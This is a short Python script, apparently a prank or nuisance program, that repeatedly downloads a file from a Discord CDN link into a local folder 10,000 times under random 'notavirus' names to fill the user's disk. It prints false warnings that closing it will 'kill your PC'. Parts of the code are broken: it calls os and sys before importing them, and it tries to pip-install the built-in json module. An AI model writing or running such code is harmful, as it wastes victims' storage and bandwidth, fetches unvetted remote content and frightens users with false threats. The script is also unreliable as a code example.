def install(package):
    os.system(f"{sys.executable} -m pip install {package}")

try:
    import requests
except ModuleNotFoundError:
    install("requests")

try:
    import pystyle
except ModuleNotFoundError:
    install("pystyle")

try:
    import colorama
except ModuleNotFoundError:
    install("colorama")

try:
    import json
except ModuleNotFoundError:
    install("json")

try:
    import json
except ModuleNotFoundError:
    install("json")

import sys
import pystyle
from pystyle import Colorate, Colors
import colorama
from colorama import Fore
colorama.init()
import os
import requests
import json
import time
from time import sleep
import random
from random import randint



cmd = 'mode 50,50'
os.system(cmd)

print(Colorate.Horizontal(Colors.green_to_black,"$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n\n", 1))
print("")

print(Colorate.Horizontal(Colors.green_to_white,"Welcome to the program, You MUST wait...\n\n", 1))
time.sleep(1)
print(Colorate.Horizontal(Colors.green_to_white,"The program will now load...\n\n", 1))
print("")
print(Colorate.Horizontal(Colors.red_to_yellow,"Note: Closing this will kill your PC...\n\n", 1))
print("")
print(Colorate.Horizontal(Colors.blue_to_purple,"Downloading all files...\n\n", 1))

def download_files():
    os.system(f"title {random.randint(1, 100000)} - Made by DEV_S4M on GitHub")
    if not os.path.exists('./data/'): os.makedirs('./data/')
    if not os.path.isfile(f'./data/notavirus-{random.randint(1, 10000000)}'): open(f'./data/notavirus-{random.randint(1, 10000000)}', 'wb').write(requests.get('https://cdn.discordapp.com/attachments/1066222613812232233/1089270717847191552/1.txt', allow_redirects=True).content)
    print("")
    print(Colorate.Horizontal(Colors.green_to_white,f"Downloaded notavirus-{random.randint(1, 100000)} successfully!\n\n", 1))
    print(Colorate.Horizontal(Colors.red_to_yellow,"- Note: Closing this will kill your PC...\n\n", 1))


count = 0
while (count < 10000):
    count = count + 1
    download_files()


input(Colorate.Horizontal(Colors.red_to_yellow,"\nIf you made it here, you have a lot of storage... Press enter to close.", 1))